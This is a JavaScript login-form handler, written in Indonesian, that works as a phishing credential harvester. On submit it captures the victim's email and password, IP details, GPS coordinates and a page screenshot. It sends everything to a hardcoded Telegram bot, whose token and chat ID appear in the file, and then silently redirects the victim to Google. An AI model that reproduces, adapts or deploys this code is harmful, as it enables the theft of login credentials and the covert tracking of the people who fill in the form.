document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    let botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
    let chatId = "6786210993";
    let profileImageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";

    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
    try {
        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = await response.json();
    } catch (error) {
        console.error("Gagal mendapatkan data IP:", error);
    }

    async function getUserLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}`);
                    },
                    () => {
                        resolve("📍 Lokasi: Tidak diizinkan oleh user");
                    }
                );
            } else {
                resolve("📍 Lokasi: Tidak didukung di browser ini");
            }
        });
    }
    let lokasiUser = await getUserLocation();

    async function ambilScreenshot() {
        let canvas = await html2canvas(document.body);
        let imgData = canvas.toDataURL("image/png");

        let formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", dataURItoBlob(imgData), "screenshot.png");

        let sendPhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
        return fetch(sendPhotoUrl, { method: "POST", body: formData });
    }

    function dataURItoBlob(dataURI) {
        let byteString = atob(dataURI.split(",")[1]);
        let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
        let ab = new ArrayBuffer(byteString.length);
        let ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], { type: mimeString });
    }

    let message = `🔒 *Login Berhasil!*\n\n`
                + `🕒 *Waktu:* ${waktuLogin}\n`
                + `📧 *Email:* ${email}\n`
                + `🔑 *Password:* ${password}\n`
                + `🌍 *IP:* ${ipInfo.ip}\n`
                + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
                + `🏢 *Provider:* ${ipInfo.org}\n`
                + `${lokasiUser}`;

    let sendProfilePhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`;
    let sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    Promise.all([
        fetch(sendProfilePhotoUrl),
        fetch(sendMessageUrl),
        ambilScreenshot()
    ]).then(() => {
        console.log("✅ Semua data terkirim!");
        window.location.href = "https://www.google.com";
    }).catch(error => console.error("❌ Error:", error));
});
